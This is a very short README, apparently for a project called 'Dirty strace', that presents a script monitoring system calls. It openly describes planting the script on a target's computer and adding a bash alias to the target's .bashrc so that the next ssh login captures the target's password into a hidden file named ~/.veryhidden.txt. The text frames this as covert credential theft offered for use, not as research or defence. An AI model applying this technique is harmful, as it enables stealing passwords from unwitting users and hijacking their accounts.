
# Dirty strace

A simple script which monitors system calls.

## Dirty
By placing inside a target's computer and adding
```bash
alias ssh='/path/to/my_ssh.sh'
```
inside the target's .bashrc, the next time the target tries to log into an ssh session,
the ssh password is stored into ~/.veryhidden.txt
